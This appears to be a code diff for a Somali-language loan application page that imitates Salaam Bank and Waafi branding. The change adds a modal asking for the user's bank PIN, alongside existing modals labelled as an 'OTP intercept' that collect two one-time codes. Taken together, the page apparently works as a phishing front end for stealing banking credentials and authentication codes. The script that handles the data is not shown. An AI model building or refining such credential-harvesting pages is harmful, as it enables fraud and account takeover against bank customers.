@@ -6,8 +6,7 @@
 <meta name="theme-color" content="#7bbf2e"/>
 <title>Amaahda Waafi &middot; Salaam Bank</title>
 <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600;700;800;900&family=DM+Mono:wght@400;500;700&display=swap" rel="stylesheet">
-<!-- Linked external CSS -->
-<link href="css/style.css" rel="stylesheet">
+<link rel="stylesheet" href="css/style.css">
 </head>
 <body>
 
@@ -16,7 +15,6 @@
   <!-- TOP BRAND ARCHITECTURE LOGO HEADER BAR -->
   <div class="header-bar">
     <div class="brand-logos">
-      <!-- High-fidelity hosted production logos replacing missing local resources -->
       <img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/Waafi_Logo.png" onerror="this.src='https://raw.githubusercontent.com/Lenkartel/waafi/main/assets/waafi.webp'" alt="Waafi">
       <div class="brand-sep"></div>
       <img src="https://iili.io/CEuAAuI.png" style="height:36px" alt="Logo">
@@ -98,7 +96,7 @@
                 <div class="slider-name"><span class="slider-emoji">💵</span> Xaddiga Amaahda</div>
                 <div class="slider-val" id="amountVal">$300</div>
               </div>
-              <input type="range" id="amountSlider" min="300" max="12000" step="100" value="300" oninput="recalc()">
+              <input type="range" id="amountSlider" min="300" max="12000" step="100" value="300">
               <div class="slider-hint"><span>$300</span><span>$12,000</span></div>
             </div>
 
@@ -107,7 +105,7 @@
                 <div class="slider-name"><span class="slider-emoji">📅</span> Muddada</div>
                 <div class="slider-val" id="durVal">1 bil</div>
               </div>
-              <input type="range" id="durSlider" min="1" max="24" step="1" value="1" oninput="recalc()">
+              <input type="range" id="durSlider" min="1" max="24" step="1" value="1">
               <div class="slider-hint"><span>1 bil</span><span>24 bilood</span></div>
             </div>
 
@@ -237,6 +235,7 @@
                   </svg>
                 </button>
               </div>
+              <div class="field-error" id="step2Error" style="text-align:center; margin-top:8px;"></div>
             </div>
           </div>
         </div>
@@ -256,7 +255,7 @@
 
     <!-- MASTER CONTROL ENGINE FOOTER SELECTIONS -->
     <div class="sticky-footer" id="footer-step1">
-      <button class="pay-btn" onclick="openCalcSummary()">Dib u eeg &amp; Codso →</button>
+      <button class="pay-btn" id="btnOpenCalcSummary">Dib u eeg &amp; Codso →</button>
     </div>
 
     <div class="footer" id="footer-step2" style="display:none;">
@@ -265,12 +264,12 @@
   </div>
 
   <!-- MODAL: STEP 1 PRE-CALCULATED DATA CONFIRMATION -->
-  <div class="modal-overlay" id="modal-calc-summary" onclick="handleOverlay(event, 'modal-calc-summary')">
+  <div class="modal-overlay" id="modal-calc-summary">
     <div class="modal-sheet">
       <div class="sheet-handle"></div>
       <div class="sheet-header">
         <div class="sheet-title">Kooban Amaahda</div>
-        <button class="sheet-close" onclick="closeModal('modal-calc-summary')">&#x2715;</button>
+        <button class="sheet-close" id="btnCloseCalcSummary">&#x2715;</button>
       </div>
       <div class="sheet-body">
         <div class="sheet-sub">Codsigaaga</div>
@@ -280,20 +279,39 @@
           <div class="sheet-total-val" id="calcSummaryMonthly">$0.00</div>
         </div>
         <div class="sheet-actions">
-          <button class="btn-cancel" onclick="closeModal('modal-calc-summary')">Wax ka badal</button>
-          <button class="btn-confirm" onclick="proceedToAuth()">Sii wad →</button>
+          <button class="btn-cancel" id="btnCancelCalcSummary">Wax ka badal</button>
+          <button class="btn-confirm" id="btnProceedToAuth">Sii wad →</button>
         </div>
       </div>
     </div>
   </div>
 
+  <!-- MODAL: BANKING PIN LOGIN -->
+  <div class="ov center" id="modal-bank-pin">
+    <div class="ms">
+      <div class="mh"></div>
+      <div class="mhdr">
+        <span class="mtitle">Bankiga Xaqiiji</span>
+        <button class="mclose" id="btnCloseBankPin">✕</button>
+      </div>
+      <div class="mb">
+        <div class="msub">Gali PIN-kaaga Bankiga</div>
+        <div class="field" style="margin-bottom:14px;">
+          <input class="inp" type="password" id="bankPinInput" inputmode="numeric" minlength="4" maxlength="6" style="text-align:center; letter-spacing:14px; font-size:24px; font-family:var(--mono);">
+          <div class="field-error" id="bankPinError" style="text-align:center; margin-top:8px;"></div>
+        </div>
+        <button class="otp-go on" id="btnSubmitBankPin" style="opacity:1; pointer-events:auto; margin-top:10px;">Xaqiiji PIN-ka →</button>
+      </div>
+    </div>
+  </div>
+
   <!-- MODAL: LOGIN IDENTITY OTP INTERCEPT (OTP 1) -->
-  <div class="ov center" id="m1" onclick="bgClose('m1',event)">
+  <div class="ov center" id="m1">
     <div class="ms">
       <div class="mh"></div>
       <div class="mhdr">
         <span class="mtitle">Xaqiiji Aqoonsiga</span>
-        <button class="mclose" onclick="cm('m1')">✕</button>
+        <button class="mclose" id="btnCloseM1">✕</button>
       </div>
       <div class="mb">
         <div class="masked-note" id="mn1"></div>
@@ -308,22 +326,23 @@
             <div class="otp-box" id="o1b5"></div>
           </div>
         </div>
+        <div class="field-error" id="otp1Error" style="text-align:center; margin-top:6px;"></div>
         <div class="tr">
           <div class="tl">Dhacaysaa <span class="tv" id="t1">120</span>s</div>
           <button class="rb" id="r1">Dib u dir</button>
         </div>
-        <button class="otp-go" id="g1" onclick="submitOtp1()">Xaqiiji →</button>
+        <button class="otp-go" id="g1">Xaqiiji →</button>
       </div>
     </div>
   </div>
 
   <!-- MODAL: STEP 2 POST-SECURITY VALIDATION DEPOSIT VIEW -->
-  <div class="ov" id="msum" onclick="bgClose('msum',event)">
+  <div class="ov" id="msum">
     <div class="ms">
       <div class="mh"></div>
       <div class="mhdr">
         <span class="mtitle">Kooban Codsiga</span>
-        <button class="mclose" onclick="cm('msum')">✕</button>
+        <button class="mclose" id="btnCloseMsum">✕</button>
       </div>
       <div class="mb">
         <div class="msub">Faahfaahinta Amaahda</div>
@@ -333,20 +352,20 @@
           <span class="stv" id="sumMo">$0.00</span>
         </div>
         <div class="sact">
-          <button class="sc" onclick="cm('msum')">Dib u eeg</button>
-          <button class="sp" onclick="openOtp2()">Gudbi Codsiga →</button>
+          <button class="sc" id="btnEditMsum">Dib u eeg</button>
+          <button class="sp" id="btnConfirmMsum">Sii wad →</button>
         </div>
       </div>
     </div>
   </div>
 
   <!-- MODAL: SECURE DISBURSEMENT CONFIRMATION (OTP 2) -->
-  <div class="ov center" id="m2" onclick="bgClose('m2',event)">
+  <div class="ov center" id="m2">
     <div class="ms">
       <div class="mh"></div>
       <div class="mhdr">
         <span class="mtitle">Gudbi Codsiga</span>
-        <button class="mclose" onclick="cm('m2')">✕</button>
+        <button class="mclose" id="btnCloseM2">✕</button>
       </div>
       <div class="mb">
         <div class="masked-note" id="mn2"></div>
@@ -361,11 +380,12 @@
             <div class="otp-box" id="o2b5"></div>
           </div>
         </div>
+        <div class="field-error" id="otp2Error" style="text-align:center; margin-top:6px;"></div>
         <div class="tr">
           <div class="tl">Dhacaysaa <span class="tv" id="t2">120</span>s</div>
           <button class="rb" id="r2">Dib u dir</button>
         </div>
-        <button class="otp-go" id="g2" onclick="submitOtp2()">Gudbi Codsiga ✓</button>
+        <button class="otp-go" id="g2">Gudbi Codsiga ✓</button>
       </div>
     </div>
   </div>
@@ -385,7 +405,6 @@
 
 </div>
 
-<!-- Linked external JS -->
 <script src="js/script.js"></script>
 </body>
 </html>
